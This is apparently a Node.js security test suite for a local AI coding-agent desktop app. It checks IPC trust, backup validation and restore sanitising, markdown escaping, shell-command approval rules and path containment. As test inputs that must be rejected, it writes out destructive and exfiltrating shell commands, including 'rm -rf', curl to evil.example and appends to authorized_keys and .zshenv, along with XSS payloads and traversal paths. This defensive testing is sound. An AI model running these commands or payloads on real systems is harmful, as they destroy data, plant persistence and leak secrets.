/**
 * Deterministic security-hardening tests (v5 R7–R10). Plain Node, temp dirs only,
 * no network access performed (remote-host URLs are only validated, never fetched).
 * Run: node tests/security.test.mjs   (requires `npm run build:main` first)
 */
import assert from "node:assert/strict";
import fs from "node:fs";
import fsp from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { createRequire } from "node:module";
import ts from "typescript";
import { Store, commandApprovalDecision, commandMatchesPattern, commandHasShellControl, sanitizeRulesPatterns, pathInWriteScopes, isTrustedRendererUrl } from "../dist-electron/electron/store.js";
import { Storage, BACKUP_LIMITS, DEFAULT_SETTINGS, isValidChatId, isValidArchiveId, parseTarVerboseListing, validateBackupMembers, validateBackupTree, validateChatRecordShape, validSettingsDocument, swapDataRoot } from "../dist-electron/electron/storage.js";
import { boundMcpOutput, MCP_LIMITS, McpManager } from "../dist-electron/electron/agent/mcp.js";
import { matchGlobName, resolveWithin } from "../dist-electron/electron/agent/tools.js";
import { loopbackBase, isLoopbackHost } from "../dist-electron/electron/agent/providers/localUrl.js";
import "./openai-compatible-provider.test.mjs";

let passed = 0;
const failures = [];
function ok(cond, label) {
  if (cond) passed++;
  else {
    failures.push(label);
    console.error("FAIL:", label);
  }
}
async function throws(fn, label) {
  try {
    await fn();
    failures.push(label + " (did not throw)");
    console.error("FAIL:", label, "(did not throw)");
  } catch {
    ok(true, label);
  }
}

// ---------- privileged renderer boundary ----------
const trustedFileUrl = "file:///Applications/XtracsysCode/dist-web/index.html";
const chatId = "8f14e45f-ea5b-4f32-a2b1-9b2c4d6e8f10";
ok(isTrustedRendererUrl(trustedFileUrl, trustedFileUrl), "ipc: exact app file URL trusted");
ok(isTrustedRendererUrl(`${trustedFileUrl}?chat=${chatId}`, trustedFileUrl), "ipc: validated chat query trusted");
ok(!isTrustedRendererUrl("https://evil.example/", trustedFileUrl), "ipc: remote frame URL rejected");
ok(!isTrustedRendererUrl("file:///Applications/XtracsysCode/other.html", trustedFileUrl), "ipc: other local file rejected");
ok(!isTrustedRendererUrl("file://evil.example/Applications/XtracsysCode/dist-web/index.html", trustedFileUrl), "ipc: alternate file authority rejected");
ok(!isTrustedRendererUrl(`${trustedFileUrl}?chat=${chatId}&extra=1`, trustedFileUrl), "ipc: unknown query parameters rejected");
ok(!isTrustedRendererUrl(`${trustedFileUrl}?chat=../../settings`, trustedFileUrl), "ipc: traversal query rejected");
ok(isTrustedRendererUrl(`http://127.0.0.1:5173/?chat=${chatId}`, "http://127.0.0.1:5173/"), "ipc: exact dev origin accepted");
ok(!isTrustedRendererUrl("http://localhost:5173/", "http://127.0.0.1:5173/"), "ipc: alternate dev host rejected");
const repoPath = fileURLToPath(new URL("../", import.meta.url));
const mainSource = fs.readFileSync(path.join(repoPath, "electron/main.ts"), "utf8");
const ipcRegistrations = mainSource.match(/ipcMain\.handle\(/g) ?? [];
ok(ipcRegistrations.length === 1 && /function handleIpc\(/.test(mainSource), "ipc: privileged handlers are registered only through central validation wrapper");
ok(mainSource.includes("event.senderFrame") && mainSource.includes("event.sender.mainFrame") && mainSource.includes("event.sender.getURL()"), "ipc: sender frame and both renderer URLs are checked");
ok(mainSource.includes("setWindowOpenHandler") && mainSource.includes("will-navigate") && mainSource.includes("will-redirect"), "navigation: popups denied and navigation restricted");
ok(/validateBackupTree\(staging\);\s*await sanitizeBackupForRestore\(staging\)/.test(mainSource), "backup restore: executable configuration is sanitized after validation");
ok(/handleIpc\("plugins:test"[\s\S]*?askPluginRunConsent\(event, rec, launch, purpose\)[\s\S]*?mcps\.start\(\[launch\], launch\.cwd\)/.test(mainSource), "plugins: main-process consent gates the exact launch descriptor and cwd");

// ---------- integrated release boundaries (packaged execution verified separately) ----------
const pluginTestHandler = mainSource.slice(mainSource.indexOf('handleIpc("plugins:test"'), mainSource.indexOf('handleIpc("rules:allow-always"'));
ok(!pluginTestHandler.includes("if (!reviewed) await pluginStore.markReviewed") && pluginTestHandler.includes("await pluginStore.markReviewed(pluginId, true, review.token)"), "plugins: every test revalidates the dialog's source identity");
ok(pluginTestHandler.includes("pluginStore.launchConfig(pluginId)"), "plugins: test obtains a freshly validated descriptor immediately before spawn");
ok(mainSource.includes("XTRAC_PACKAGE_SMOKE_OK") && mainSource.includes("configurePackageSmoke(app)"), "package smoke: explicit isolated startup mode and readiness marker installed");
ok(mainSource.indexOf("configurePackageSmoke(app)") >= 0 && mainSource.indexOf("configurePackageSmoke(app)") < mainSource.indexOf("app.requestSingleInstanceLock()"), "package smoke: persistence paths configured before instance lock");
ok(mainSource.includes('packageSmokeIpc(channel, packageSmoke)') && mainSource.includes('if (!packageSmoke)'), "package smoke: IPC guarded and background automation suppressed");
const runnerSource = fs.readFileSync(path.join(repoPath, "electron/runner.ts"), "utf8");
ok(runnerSource.includes("const shutdownIssues = await mcps.stopAll()") && runnerSource.includes("MCP shutdown warning:"), "mcp: runtime surfaces shutdown diagnostics");
const { validatePackageSmoke, packageSmokeIpc, configurePackageSmoke } = await import("../dist-electron/electron/packageSmoke.js");
ok(validatePackageSmoke({}, []) === null, "package smoke: normal app startup unaffected");
ok(validatePackageSmoke({ XTRAC_PACKAGE_SMOKE: "true" }, []) === null, "package smoke: strict opt-in flag");
await throws(() => validatePackageSmoke({ XTRAC_PACKAGE_SMOKE: "1" }, []), "package smoke: missing root rejected");
await throws(() => validatePackageSmoke({ XTRAC_PACKAGE_SMOKE: "1", XTRAC_E2E: "1" }, []), "package smoke: inference E2E mode rejected");
const smokeParent = path.join(os.homedir(), ".cache/xtracsyscode-sprint");
await fsp.mkdir(smokeParent, { recursive: true });
const smokeRoot = await fsp.mkdtemp(path.join(smokeParent, "mac-verify-"));
try {
  const home = path.join(smokeRoot, "home"), tmp = path.join(smokeRoot, "tmp");
  await fsp.mkdir(home); await fsp.mkdir(tmp);
  const env = { XTRAC_PACKAGE_SMOKE: "1", XTRAC_PACKAGE_SMOKE_ROOT: smokeRoot, HOME: home, CFFIXED_USER_HOME: home, TMPDIR: tmp + path.sep };
  const argv = [`--user-data-dir=${path.join(smokeRoot, "user-data")}`];
  const config = validatePackageSmoke(env, argv);
  ok(config.root === smokeRoot && config.data === path.join(smokeRoot, "data"), "package smoke: explicit isolated data root validated");
  await throws(() => validatePackageSmoke({ ...env, HOME: os.homedir() }, argv), "package smoke: real HOME rejected");
  await throws(() => validatePackageSmoke(env, []), "package smoke: implicit user-data path rejected");
  ok(packageSmokeIpc("state:get", config) === null, "package smoke: real state/preload handshake permitted");
  ok(packageSmokeIpc("backends:models", config).value.ollama.length === 0, "package smoke: model probing intercepted");
  ok(packageSmokeIpc("fs:browse", config).value.path === home, "package smoke: browse never leaves disposable home");
  for (const channel of ["chat:send", "plugins:test", "tasks:run", "data:import", "open:finder", "fs:pick-dir", "settings:set"]) {
    await throws(() => packageSmokeIpc(channel, config), `package smoke: ${channel} disabled`);
  }
  const saved = { ...process.env }, savedArgv = process.argv;
  const calls = [];
  try {
    Object.assign(process.env, env); process.argv = argv;
    configurePackageSmoke({ setPath: (key, value) => {
      assert.notEqual(key, "cache", "cache is not a documented Electron getPath/setPath name; sessionData owns browser cache");
      calls.push([key, value]);
    }, setAppLogsPath: value => calls.push(["logs", value]) });
  } finally {
    for (const key of Object.keys(process.env)) if (!(key in saved)) delete process.env[key];
    Object.assign(process.env, saved); process.argv = savedArgv;
  }
  ok(calls.length === 7 && calls.every(([, dir]) => dir.startsWith(smokeRoot + path.sep)), "package smoke: all supported Electron persistence paths redirected");
  await throws(() => validatePackageSmoke(env, argv), "package smoke: reused state rejected");
} finally { await fsp.rm(smokeRoot, { recursive: true, force: true }); }

// ---------- strict chat/archive identifiers and backup archive validation ----------
ok(isValidChatId(chatId), "chat id: canonical UUID accepted");
ok(!isValidChatId("../settings"), "chat id: traversal rejected");
ok(!isValidChatId(`${chatId}.json`), "chat id: suffix rejected");
ok(isValidArchiveId(`${chatId}-1700000000000`), "archive id: collision timestamp supported");
ok(!isValidArchiveId(`${chatId}-../../settings`), "archive id: traversal suffix rejected");
const listing = parseTarVerboseListing(
  "drwxr-xr-x 0/0 0 2026-10-18 10:00 XtracsysCode/\n-rw-r--r-- 0/0 14 2026-10-18 10:00 XtracsysCode/chats/chat one.json",
);
const bsdListing = parseTarVerboseListing("-rw-r--r--  0 501  20 14 Oct 18 10:00 XtracsysCode/settings.json");
const crlfListing = parseTarVerboseListing("drwxr-xr-x 0/0 0 2026-10-18 10:00 XtracsysCode/\r\n-rw-r--r-- 0/0 14 2026-10-18 10:00 XtracsysCode/settings.json\r\n");
ok(listing.length === 2 && listing[1].path === "XtracsysCode/chats/chat one.json", "backup: typed tar listing preserves spaces in member names");
ok(bsdListing[0].size === 14 && bsdListing[0].path === "XtracsysCode/settings.json", "backup: BSD verbose listing parses typed owner/group fields");
ok(crlfListing.length === 2 && crlfListing[1].path === "XtracsysCode/settings.json", "backup: Windows CRLF verbose tar listing parses typed members");
ok(validateBackupMembers(listing, "XtracsysCode").length === 2, "backup: safe typed members accepted");
await throws(() => validateBackupMembers([{ type: "l", path: "XtracsysCode/chats/link", size: 0 }], "XtracsysCode"), "backup: symlink member rejected by type");
await throws(() => validateBackupMembers([{ type: "-", path: "XtracsysCode/../outside", size: 0 }], "XtracsysCode"), "backup: traversal member rejected");
await throws(() => validateBackupMembers([{ type: "-", path: "C:/outside", size: 0 }], "XtracsysCode"), "backup: Windows absolute path rejected");
await throws(() => validateBackupMembers([{ type: "d", path: "XtracsysCode/", size: 0 }, { type: "-", path: `XtracsysCode/chats${String.fromCharCode(92)}bad`, size: 0 }], "XtracsysCode"), "backup: backslash member path rejected");
await throws(() => validateBackupMembers([{ type: "d", path: "XtracsysCode/", size: 0 }, { type: "-", path: "XtracsysCode/file ", size: 0 }], "XtracsysCode"), "backup: trailing-whitespace path rejected");
await throws(() => validateBackupMembers([{ type: "d", path: "XtracsysCode/", size: 0 }, { type: "-", path: "XtracsysCode/settings.json", size: BACKUP_LIMITS.maxFileBytes + 1 }], "XtracsysCode"), "backup: oversized member rejected");
const deepMember = `XtracsysCode/${Array.from({ length: BACKUP_LIMITS.maxDepth }, (_, index) => `d${index}`).join("/")}/file`;
await throws(() => validateBackupMembers([{ type: "d", path: "XtracsysCode/", size: 0 }, { type: "-", path: deepMember, size: 0 }], "XtracsysCode"), "backup: directory depth limit enforced");
await throws(() => validateBackupMembers([{ type: "h", path: "XtracsysCode/hardlink", size: 0 }], "XtracsysCode"), "backup: hardlink member rejected by type");
const expandedMembers = [{ type: "d", path: "XtracsysCode/", size: 0 }, ...Array.from({ length: 5 }, (_, index) => ({ type: "-", path: `XtracsysCode/file-${index}`, size: BACKUP_LIMITS.maxFileBytes }))];
await throws(() => validateBackupMembers(expandedMembers, "XtracsysCode"), "backup: aggregate expanded-size limit enforced");
await throws(() => validateBackupMembers(parseTarVerboseListing("lrwxr-xr-x 0/0 0 2026-10-18 10:00 XtracsysCode/link -> /etc/passwd"), "XtracsysCode"), "backup: typed symlink listing rejected");

const idsRoot = fs.mkdtempSync(path.join(os.tmpdir(), "xtrac-sec-ids-"));
const idsStorage = new Storage(idsRoot);
await throws(() => idsStorage.chatJson("../settings"), "storage: invalid chat id cannot form a path");
await throws(() => idsStorage.archivePath("../../outside", ".json"), "storage: invalid archive id cannot form a path");
const idStore = new Store(idsStorage);
const otherChatId = "8f14e45f-ea5b-4f32-a2b1-9b2c4d6e8f11";
await idsStorage.writeJsonAtomic(idsStorage.chatJson(chatId), { id: otherChatId, messages: [], timeline: [] });
ok(idStore.getChat(chatId) === null && idStore.listChatSummaries().length === 0, "chat record: embedded ID must match its validated filename");
await throws(() => idStore.persistChat({ id: "../settings", messages: [], timeline: [] }), "chat record: invalid ID rejected before persistence");
await throws(() => idStore.deleteChat("../settings"), "chat record: invalid ID rejected before deletion");
const stagedBackup = fs.mkdtempSync(path.join(os.tmpdir(), "xtrac-sec-backup-"));
const validSettings = { version: 1, dataRoot: stagedBackup, provider: "gmlx", ollamaUrl: "http://127.0.0.1:11434", llamaCppUrl: "http://127.0.0.1:8080", openAICompatibleUrl: "http://127.0.0.1:8080", model: "test", approvalMode: "ask", maxSteps: 24, historyCharBudget: 80000, systemPromptExtra: "", caps: { logMaxBytes: 5 * 1024 * 1024, chatsMaxBytes: 200 * 1024 * 1024, keepChatDays: 1, tmpMaxBytes: 100 * 1024 * 1024 } };
fs.writeFileSync(path.join(stagedBackup, "settings.json"), JSON.stringify(validSettings));
fs.writeFileSync(path.join(stagedBackup, "projects.json"), "[]");
ok((await validateBackupTree(stagedBackup)).files === 2, "backup: extracted regular tree and required JSON accepted");
const invalidProjectTree = fs.mkdtempSync(path.join(os.tmpdir(), "xtrac-sec-backup-project-schema-"));
fs.writeFileSync(path.join(invalidProjectTree, "settings.json"), JSON.stringify(validSettings));
fs.writeFileSync(path.join(invalidProjectTree, "projects.json"), JSON.stringify([{ id: 5, name: "bad", cwd: "" }]));
await throws(() => validateBackupTree(invalidProjectTree), "backup: malformed project schema rejected");
const invalidSettingsTree = fs.mkdtempSync(path.join(os.tmpdir(), "xtrac-sec-backup-settings-schema-"));
fs.writeFileSync(path.join(invalidSettingsTree, "settings.json"), JSON.stringify({ version: 99 }));
fs.writeFileSync(path.join(invalidSettingsTree, "projects.json"), "[]");
await throws(() => validateBackupTree(invalidSettingsTree), "backup: unsupported settings schema rejected");
const invalidTaskTree = fs.mkdtempSync(path.join(os.tmpdir(), "xtrac-sec-backup-task-schema-"));
fs.writeFileSync(path.join(invalidTaskTree, "settings.json"), JSON.stringify(validSettings));
fs.writeFileSync(path.join(invalidTaskTree, "projects.json"), "[]");
fs.writeFileSync(path.join(invalidTaskTree, "tasks.json"), JSON.stringify([null]));
await throws(() => validateBackupTree(invalidTaskTree), "backup: malformed task schema rejected");
const restoreRiskTree = fs.mkdtempSync(path.join(os.tmpdir(), "xtrac-sec-backup-restore-risk-"));
fs.writeFileSync(path.join(restoreRiskTree, "settings.json"), JSON.stringify({ ...validSettings, approvalMode: "auto" }));
fs.writeFileSync(path.join(restoreRiskTree, "projects.json"), JSON.stringify([{ id: "project-1", name: "untrusted", cwd: process.cwd(), mcps: [{ name: "injected", command: "would-run", args: [] }], settings: { approvalMode: "auto" } }]));
fs.writeFileSync(path.join(restoreRiskTree, "tasks.json"), JSON.stringify([{ id: "task-1", name: "periodic", prompt: "run", projectId: "project-1", intervalMinutes: 1, lastRunAt: null, lastStatus: null }]));
fs.mkdirSync(path.join(restoreRiskTree, "chats"));
fs.writeFileSync(path.join(restoreRiskTree, "chats", `${chatId}.json`), JSON.stringify({ id: chatId, messages: [], timeline: [], approvalMode: "auto" }));
const { sanitizeBackupForRestore } = await import("../dist-electron/electron/storage.js");
ok(typeof sanitizeBackupForRestore === "function", "backup restore: sanitizer is available");
if (typeof sanitizeBackupForRestore === "function") {
  await validateBackupTree(restoreRiskTree);
  await sanitizeBackupForRestore(restoreRiskTree);
  const restoredSettings = JSON.parse(fs.readFileSync(path.join(restoreRiskTree, "settings.json"), "utf8"));
  const restoredProjects = JSON.parse(fs.readFileSync(path.join(restoreRiskTree, "projects.json"), "utf8"));
  const restoredTasks = JSON.parse(fs.readFileSync(path.join(restoreRiskTree, "tasks.json"), "utf8"));
  const restoredChat = JSON.parse(fs.readFileSync(path.join(restoreRiskTree, "chats", `${chatId}.json`), "utf8"));
  ok(restoredSettings.approvalMode === "ask", "backup restore: global auto-approval resets to ask");
  ok(restoredProjects[0].mcps?.length === 0, "backup restore: project MCP commands are removed");
  ok(restoredProjects[0].settings.approvalMode === "ask", "backup restore: project auto-approval resets to ask");
  ok(restoredTasks[0].intervalMinutes === null, "backup restore: scheduled tasks are paused");
  ok(restoredChat.approvalMode === "ask", "backup restore: chat auto-approval resets to ask");
}
const validChat = { id: chatId, messages: [], timeline: [] };
fs.mkdirSync(path.join(stagedBackup, "chats"));
fs.writeFileSync(path.join(stagedBackup, "chats", `${chatId}.json`), JSON.stringify(validChat));
fs.writeFileSync(path.join(stagedBackup, "chats", `${chatId}.md`), "# chat");
fs.mkdirSync(path.join(stagedBackup, "archive"));
fs.writeFileSync(path.join(stagedBackup, "archive", `${chatId}-1700000000000.json`), JSON.stringify(validChat));
ok((await validateBackupTree(stagedBackup)).files === 7, "backup: valid chat/archive records and transcripts accepted");
const invalidChatTree = fs.mkdtempSync(path.join(os.tmpdir(), "xtrac-sec-backup-chat-id-"));
fs.writeFileSync(path.join(invalidChatTree, "settings.json"), JSON.stringify(validSettings));
fs.writeFileSync(path.join(invalidChatTree, "projects.json"), "[]");
fs.mkdirSync(path.join(invalidChatTree, "chats"));
fs.writeFileSync(path.join(invalidChatTree, "chats", "invalid.json"), "{}");
await throws(() => validateBackupTree(invalidChatTree), "backup: invalid chat filename rejected");
const unsafeTree = fs.mkdtempSync(path.join(os.tmpdir(), "xtrac-sec-backup-link-"));
fs.writeFileSync(path.join(unsafeTree, "settings.json"), JSON.stringify(validSettings));
fs.writeFileSync(path.join(unsafeTree, "projects.json"), "[]");
if (process.platform !== "win32") {
  fs.symlinkSync(path.join(unsafeTree, "settings.json"), path.join(unsafeTree, "link"));
  await throws(() => validateBackupTree(unsafeTree), "backup: extracted symlink rejected");
}
const swapRoot = fs.mkdtempSync(path.join(os.tmpdir(), "xtrac-sec-swap-root-"));
const swapStage = fs.mkdtempSync(path.join(os.tmpdir(), "xtrac-sec-swap-stage-"));
const swapBackup = `${swapRoot}.backup`;
fs.writeFileSync(path.join(swapRoot, "prior.txt"), "preserved");
fs.writeFileSync(path.join(swapStage, "new.txt"), "replacement");
let failedStageRename = false;
await throws(
  () => swapDataRoot(swapRoot, swapStage, swapBackup, async (from, to) => {
    if (from === swapStage && !failedStageRename) {
      failedStageRename = true;
      throw new Error("simulated stage rename failure");
    }
    return fs.promises.rename(from, to);
  }),
  "backup: failed swap is reported",
);
ok(fs.readFileSync(path.join(swapRoot, "prior.txt"), "utf8") === "preserved" && !fs.existsSync(swapBackup), "backup: failed swap rolls original root back");

// ---------- bounded MCP output and abortable process lifecycle ----------
ok(MCP_LIMITS.maxServers === 8 && MCP_LIMITS.maxPending === 32 && MCP_LIMITS.maxLineChars === 1_048_576 && MCP_LIMITS.maxTotalOutputChars === 16_777_216 && MCP_LIMITS.maxTools === 128, "mcp: server, request, output and tool counts are bounded");
ok(boundMcpOutput("x".repeat(100), 16).length === 16, "mcp: tool output stays within the configured character limit");
const slowMcp = new McpManager();
const cancelController = new AbortController();
const slowServer = "process.stdin.setEncoding('utf8');let b='';process.stdin.on('data',d=>{b+=d;for(;;){const i=b.indexOf(String.fromCharCode(10));if(i<0)return;const m=JSON.parse(b.slice(0,i));b=b.slice(i+1);if(m.method==='initialize')process.stdout.write(JSON.stringify({jsonrpc:'2.0',id:m.id,result:{}})+String.fromCharCode(10));}});setInterval(()=>{},1000)";
const cancelTimer = setTimeout(() => cancelController.abort(), 100);
const cancelledStart = await slowMcp.start([{ name: "cancel-test", command: process.execPath, args: ["-e", slowServer] }], process.cwd(), cancelController.signal);
clearTimeout(cancelTimer);
ok(cancelledStart.some((error) => error.includes("cancelled")), "mcp: abort cancels pending startup and returns after cleanup");
await slowMcp.stopAll();

// ---------- Markdown output is escaped/scheme-filtered using the actual TS implementation ----------
const formatSource = fs.readFileSync(path.join(repoPath, "web/src/lib/format.ts"), "utf8");
const formatJs = ts.transpileModule(formatSource, {
  compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2022, esModuleInterop: true },
}).outputText;
const formatModule = { exports: {} };
new Function("require", "module", "exports", formatJs)(createRequire(fileURLToPath(import.meta.url)), formatModule, formatModule.exports);
const rendered = formatModule.exports.renderMarkdown('<img src=x onerror=alert(1)>\n\n[x](javascript:alert(1))\n\n[y](https://example.com)');
ok(!/<img\b/i.test(rendered) && rendered.includes("&lt;img"), "markdown: raw HTML is rendered as text");
ok(!/href=["']javascript:/i.test(rendered), "markdown: executable URL schemes are not emitted");
ok(rendered.includes('href="https://example.com/"'), "markdown: ordinary HTTPS link retained");
ok(rendered.includes('rel="noopener noreferrer"'), "markdown: accepted link receives safe rel attributes");
const unsafeMarkdown = formatModule.exports.renderMarkdown('[credential](https://user:pass@example.com) ![image](https://example.com/p.png)');
ok(!unsafeMarkdown.includes("href=") && !unsafeMarkdown.includes("<img") && unsafeMarkdown.includes("image"), "markdown: credential links and remote images are not emitted");
const encodedScheme = formatModule.exports.renderMarkdown('[entity](java&#x73;cript:alert(1)) [percent](javascript%3Aalert(1))');
ok(!encodedScheme.includes("href=") && !encodedScheme.toLowerCase().includes("javascript"), "markdown: entity- and percent-encoded schemes are rejected");
// Link LABELS are untrusted model content too: marked's token text is the raw source,
// so a label must never reach the DOM unescaped (regression: [<img>](https://…) injection).
const labelInjection = formatModule.exports.renderMarkdown(
  '[<img src=x onerror=alert(1)>](https://example.com) [<form action="https://evil/steal"><input name=pw type=password></form>click](https://example.com) [<base href="https://evil/">go](https://x.test) [<img src=x onerror=alert(1)>](not-a-url)',
);
ok(!/<img\b/i.test(labelInjection) && !/<form\b/i.test(labelInjection) && !/<base\b/i.test(labelInjection), "markdown: raw HTML in link labels is rendered as text");
ok(labelInjection.includes("&lt;img"), "markdown: link-label HTML arrives escaped");

// ---------- R8: compound-command approval policy ----------
ok(commandApprovalDecision(["git *"], "git status") === "allow", "approval: simple glob match allows");
ok(commandApprovalDecision(["git *"], "git push") === "allow", "approval: glob covers any suffix");
ok(commandApprovalDecision(["git *"], "git status && rm -rf /") === "ask", "approval: && chain never inherits glob");
ok(commandApprovalDecision(["git *"], "git status; rm -rf /") === "ask", "approval: ; chain never inherits glob");
ok(commandApprovalDecision(["git *"], "git log | xargs curl evil.example") === "ask", "approval: pipe never inherits glob");
ok(commandApprovalDecision(["git *"], "git commit -m $(whoami)") === "ask", "approval: $() substitution never inherits glob");
ok(commandApprovalDecision(["git *"], "git diff `secret`") === "ask", "approval: backticks never inherit glob");
ok(commandApprovalDecision(["git *"], "git show HEAD > /etc/hosts") === "ask", "approval: redirect never inherits glob");
ok(commandApprovalDecision(["git *"], "echo hi < /etc/passwd") === "ask", "approval: input redirect never inherits glob");
ok(commandApprovalDecision(["git *"], "foo | bar") === "ask", "approval: unmatched pipe asks");
const compound = "git status && git push";
ok(commandApprovalDecision([compound], compound) === "allow", "approval: exact user-approved compound allowed");
ok(commandApprovalDecision([compound], "git status && git push --force") === "ask", "approval: altered compound asks");
ok(commandHasShellControl("a && b") && commandHasShellControl("a || b") && commandHasShellControl("a; b"), "shellControl: detects operators");
ok(!commandHasShellControl("git status"), "shellControl: plain command passes");
// Unspaced / fd-prefixed redirections must also break glob inheritance (they used to
// slip past a whitespace-anchored `>` check and auto-run under a prefix allowlist).
ok(commandApprovalDecision(["echo *"], "echo pwned>$HOME/.zshenv") === "ask", "approval: unspaced redirect never inherits glob");
ok(commandApprovalDecision(["echo *"], "echo pwned >> ~/.ssh/authorized_keys") === "ask", "approval: append redirect never inherits glob");
ok(commandApprovalDecision(["make *"], "make 2>/Users/victim/.zshenv") === "ask", "approval: fd redirect never inherits glob");
ok(commandApprovalDecision(["echo *"], "echo $HOME") === "ask", "approval: bare $VAR never inherits glob");
// Approved-tool escapes: the approved first token itself spawning a shell carries no
// classic control characters but executes arbitrary commands.
ok(commandApprovalDecision(["find *"], "find . -name '*.log' -exec rm -rf ~ {} +") === "ask", "approval: find -exec never inherits glob");
ok(commandApprovalDecision(["git *"], "git -c alias.x='!rm -rf ~' x") === "ask", "approval: git -c alias never inherits glob");
ok(commandApprovalDecision(["awk *"], "awk 'BEGIN{system(\"rm -rf ~\")}'") === "ask", "approval: awk system() never inherits glob");
ok(commandApprovalDecision(["xargs *"], "xargs sh -c 'id'") === "ask", "approval: xargs shell never inherits glob");
ok(commandApprovalDecision(["find *"], "find . -name '*.log'") === "allow", "approval: plain find still glob-allows");

// rules normalization is shared by rules:set AND rules:allow-always — blanket patterns
// and oversized lists must be rejected on both paths.
throws(() => sanitizeRulesPatterns(["*"]), "rules: blanket * rejected");
throws(() => sanitizeRulesPatterns(["* *"]), "rules: blanket '* *' rejected");
throws(() => sanitizeRulesPatterns(["*  *  *"]), "rules: multi-star blanket rejected");
throws(() => sanitizeRulesPatterns(["x".repeat(501)]), "rules: over-long pattern rejected");
throws(() => sanitizeRulesPatterns(Array.from({ length: 101 }, (_, i) => `cmd${i} *`)), "rules: over-long list rejected");
ok(sanitizeRulesPatterns(["git *", "npm run *"]).length === 2, "rules: ordinary patterns accepted");

// grep filename globs use a linear matcher — a star bomb must fail fast, not backtrack.
ok(matchGlobName("*.ts", "a.ts") && !matchGlobName("*.ts", "a.js"), "grep glob: basic wildcard semantics");
ok(matchGlobName("a*b*?c*", "axxbyczz"), "grep glob: mixed stars and question marks");
{
  const bomb = "a" + "*".repeat(30) + "z";
  const started = Date.now();
  ok(matchGlobName(bomb, "a".repeat(64) + ".txt") === false, "grep glob: star bomb does not match");
  ok(Date.now() - started < 1000, `grep glob: star bomb evaluated in linear time (${Date.now() - started}ms)`);
}

// Storage caps: a cap of 0 would make cleanup delete every chat on the next cycle —
// the schema rejects it (this now guards BOTH settings:set and backup import).
{
  const doc = structuredClone(DEFAULT_SETTINGS);
  ok(validSettingsDocument(doc), "settings: defaults validate");
  for (const zero of [["chatsMaxBytes", 0], ["logMaxBytes", 512], ["tmpMaxBytes", 0], ["keepChatDays", 0]]) {
    const bad = structuredClone(DEFAULT_SETTINGS);
    bad.caps[zero[0]] = zero[1];
    ok(!validSettingsDocument(bad), `settings: ${zero[0]}=${zero[1]} rejected`);
  }
}

// Restored chat records: shapes the renderer/agent dereference must be validated, or a
// crafted backup can crash-loop the renderer on launch.
ok(validateChatRecordShape({ messages: [{ role: "user", content: "hi" }], timeline: [{ kind: "user", id: "a", text: "x" }] }) === undefined, "chat shape: ordinary record passes");
throws(() => validateChatRecordShape({ messages: [{ role: "user", content: {} }], timeline: [] }), "chat shape: non-string message content rejected");
throws(() => validateChatRecordShape({ messages: [], timeline: [{ kind: "assistant", id: "a", text: { evil: true } }] }), "chat shape: non-string timeline text rejected");
throws(() => validateChatRecordShape({ messages: [], timeline: [{ kind: "hax", id: "a", text: "x" }] }), "chat shape: unknown timeline kind rejected");
throws(() => validateChatRecordShape({ messages: [], timeline: [{ kind: "tool", id: "a", toolCallId: "t", name: 5, title: "t", status: "ok", argsSummary: "s" }] }), "chat shape: non-string tool field rejected");
ok(commandMatchesPattern("npm run *", "npm run test"), "pattern: prefix glob");
ok(commandMatchesPattern("git status", "git status"), "pattern: exact");
ok(!commandMatchesPattern("git status", "git status --amend"), "pattern: exact does not match suffix");

// ---------- write scopes ----------
const root = fs.mkdtempSync(path.join(os.tmpdir(), "xtrac-sec-root-"));
ok(pathInWriteScopes(root, ["src/**"], path.join(root, "src", "a.ts")), "scopes: in-scope file");
ok(!pathInWriteScopes(root, ["src/**"], path.join(root, "lib", "a.ts")), "scopes: out-of-scope file");
ok(!pathInWriteScopes(root, ["src"], path.join(root, "srcx", "a.ts")), "scopes: prefix confusion rejected");

// ---------- R7: path containment ----------
// resolveWithin returns REAL paths — on macOS temp dirs live behind symlinks
// (/var → /private/var), so expectations use the root's realpath spelling.
const rootReal = fs.realpathSync(root);
ok(resolveWithin(root, "src/a.ts") === path.join(rootReal, "src/a.ts"), "path: relative resolves inside (real spelling)");
ok(resolveWithin(root, path.join(root, "x.txt")) === path.join(rootReal, "x.txt"), "path: absolute inside accepted (either root spelling)");
ok(resolveWithin(root, path.join(rootReal, "y.txt")) === path.join(rootReal, "y.txt"), "path: realpath-spelled absolute accepted");
await throws(() => resolveWithin(root, "../outside.txt"), "path: traversal rejected explicitly");
await throws(() => resolveWithin(root, "/etc/passwd"), "path: absolute outside rejected");
await throws(() => resolveWithin(root, "a/../../outside"), "path: nested traversal rejected");

// symlink: existing FILE pointing outside is rejected (POSIX-only — Windows symlink
// creation needs privileges; containment logic itself is cross-platform).
if (process.platform !== "win32") {
  const outsideFile = path.join(os.tmpdir(), `xtrac-sec-outside-${Date.now()}.txt`);
  fs.writeFileSync(outsideFile, "secret");
  fs.symlinkSync(outsideFile, path.join(root, "link.txt"));
  await throws(() => resolveWithin(root, "link.txt"), "path: symlinked file outside rejected");

  // symlink: DIRECTORY inside root pointing outside, target under it → rejected
  const outsideDir = fs.mkdtempSync(path.join(os.tmpdir(), "xtrac-sec-outdir-"));
  fs.symlinkSync(outsideDir, path.join(root, "dirlink"));
  await throws(() => resolveWithin(root, path.join("dirlink", "newfile.txt")), "path: symlinked dir rejected for new files");
  await throws(() => resolveWithin(root, path.join("dirlink", "existing.txt")), "path: symlinked dir rejected for existing targets");

  // root itself may be a symlinked path
  const realProj = fs.mkdtempSync(path.join(os.tmpdir(), "xtrac-sec-realproj-"));
  const linkToProj = `${realProj}-link`;
  fs.symlinkSync(realProj, linkToProj);
  ok(resolveWithin(linkToProj, "a.txt").startsWith(fs.realpathSync(realProj)), "path: symlinked project root normalizes to real path");
}

// new file under an existing inside dir resolves fine
fs.mkdirSync(path.join(root, "real"));
ok(resolveWithin(root, "real/newfile.txt").startsWith(path.join(rootReal, "real")), "path: new file via existing parent resolves inside");

// ---------- R9: loopback-only backend URLs ----------
ok(loopbackBase("http://127.0.0.1:11434", "Ollama") === "http://127.0.0.1:11434", "url: loopback ipv4 ok");
ok(loopbackBase("http://localhost:8080/", "llama.cpp") === "http://localhost:8080", "url: localhost ok, trailing slash trimmed");
ok(loopbackBase("http://[::1]:11434", "Ollama").includes("::1"), "url: ipv6 loopback ok");
ok(!isLoopbackHost("::"), "url: ipv6 unspecified address is not loopback");
await throws(() => loopbackBase("http://[::]:11434", "Ollama"), "url: ipv6 unspecified URL rejected");
